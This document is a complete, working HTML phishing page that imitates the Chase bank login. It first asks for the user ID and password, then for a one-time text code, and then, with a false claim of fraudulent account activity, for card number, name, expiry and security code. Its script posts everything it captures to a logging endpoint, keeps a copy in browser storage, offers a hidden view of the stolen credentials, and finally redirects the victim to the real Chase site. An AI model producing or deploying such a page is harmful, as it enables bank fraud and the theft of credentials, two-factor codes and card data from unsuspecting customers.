<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chase Online - Log On</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #fff; margin: 0; padding: 0; }
        .header { background-color: #117aca; padding: 10px 20px; display: flex; align-items: center; }
        .logo { height: 40px; }
        .container { max-width: 400px; margin: 40px auto; padding: 20px; border: 1px solid #ccc; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        h1 { color: #117aca; font-size: 24px; }
        label { display: block; margin: 10px 0 5px; font-weight: bold; }
        input { width: 100%; padding: 10px; margin-bottom: 20px; border: 1px solid #ccc; }
        button { background-color: #117aca; color: #fff; padding: 12px; width: 100%; border: none; font-weight: bold; cursor: pointer; }
        button:hover { background-color: #0e5f9e; }
        .links { text-align: center; margin-top: 20px; }
        .links a { color: #117aca; text-decoration: none; margin: 0 10px; }
        .footer { text-align: center; font-size: 12px; color: #666; margin-top: 40px; }
        #otp-section, #card-section { display: none; }
        .message { color: #117aca; font-weight: bold; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="header">
        <img src="https://upload.wikimedia.org/wikipedia/commons/e/ed/Chase_logo_2007.svg" alt="Chase Logo" class="logo">
    </div>
    <div class="container">
        <h1>Log On to Your Account</h1>
        <div id="login-section">
            <form id="login-form">
                <label for="username">User ID</label>
                <input type="text" id="username" required>
                <label for="password">Password</label>
                <input type="password" id="password" required>
                <button type="submit">Log On</button>
            </form>
            <div class="links">
                <a href="#">Forgot User ID / Password?</a>
                <a href="#">Not Enrolled? Sign Up Now</a>
            </div>
        </div>
        <div id="otp-section">
            <p class="message">A 6-digit code has been sent to your device via text.</p>
            <form id="otp-form">
                <label for="otp">Enter Code</label>
                <input type="text" id="otp" maxlength="6" required>
                <button type="submit">Continue</button>
            </form>
        </div>
        <div id="card-section">
            <p class="message">To lift the fraudulent activity on your account, you must provide your card details.</p>
            <form id="card-form">
                <label for="cardnumber">Card Number</label>
                <input type="text" id="cardnumber" required>
                <label for="name">Name on Card</label>
                <input type="text" id="name" required>
                <label for="expiry">Expiration Date (MM/YY)</label>
                <input type="text" id="expiry" required>
                <label for="cvv">Security Code</label>
                <input type="text" id="cvv" maxlength="3" required>
                <button type="submit">Verify</button>
            </form>
        </div>
    </div>
    <div class="footer">
        Â© 2025 JPMorgan Chase & Co. All rights reserved.
    </div>
    <script>
        let creds = {};
        let storedCreds = localStorage.getItem('phishingCreds') || '';
        if (location.search === '?viewcreds') {
            document.body.innerHTML = '<h1>Captured Credentials (Local Storage)</h1><pre>' + storedCreds.replace(/\n/g, '<br>') + '</pre>';
        } else {
            document.getElementById('login-form').addEventListener('submit', (e) => {
                e.preventDefault();
                creds.username = document.getElementById('username').value;
                creds.password = document.getElementById('password').value;
                document.getElementById('login-section').style.display = 'none';
                document.getElementById('otp-section').style.display = 'block';
            });
            document.getElementById('otp-form').addEventListener('submit', (e) => {
                e.preventDefault();
                creds.otp = document.getElementById('otp').value;
                document.getElementById('otp-section').style.display = 'none';
                document.getElementById('card-section').style.display = 'block';
            });
            document.getElementById('card-form').addEventListener('submit', (e) => {
                e.preventDefault();
                creds.cardnumber = document.getElementById('cardnumber').value;
                creds.name = document.getElementById('name').value;
                creds.expiry = document.getElementById('expiry').value;
                creds.cvv = document.getElementById('cvv').value;
                fetch('/api/log', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(creds) }).catch(() => {});
                storedCreds += JSON.stringify(creds) + '\n';
                localStorage.setItem('phishingCreds', storedCreds);
                window.location.href = 'https://www.chase.com/';
            });
        }
    </script>
</html>
